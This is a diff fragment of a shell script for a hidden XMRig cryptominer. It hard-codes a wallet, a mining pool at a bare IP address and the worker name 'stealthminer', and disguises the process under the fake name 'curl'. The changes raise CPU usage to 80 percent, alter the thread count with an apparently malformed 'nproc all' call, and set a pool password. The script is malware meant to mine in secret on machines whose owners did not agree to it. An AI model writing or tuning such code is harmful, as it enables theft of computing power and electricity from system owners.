@@ -4,9 +4,9 @@
 WALLET="85MLqXJjpZEUPjo9UFtWQ1C5zs3NDx7gJTRVkLefoviXbNN6CyDLKbBc3a1SdS7saaXPoPrxyTxybAnyJjYXKcFBKCJSbDp"
 POOL="134.199.197.80:443"
 WORKER_ID="stealthminer"
-CPU_USAGE="50"
+CPU_USAGE="80"
 FAKE_NAME="curl"
-THREADS=$(nproc)
+THREADS=$(nproc all)
 MAX_THREADS=$((THREADS * CPU_USAGE / 100))
 
 # === Download and extract XMRig ===
@@ -43,7 +43,7 @@ cat > config.json <<EOF
     {
       "url": "$POOL",
       "user": "$WALLET",
-      "pass": "x",
+      "pass": "Genzo",
       "keepalive": true,
       "tls": false
     }
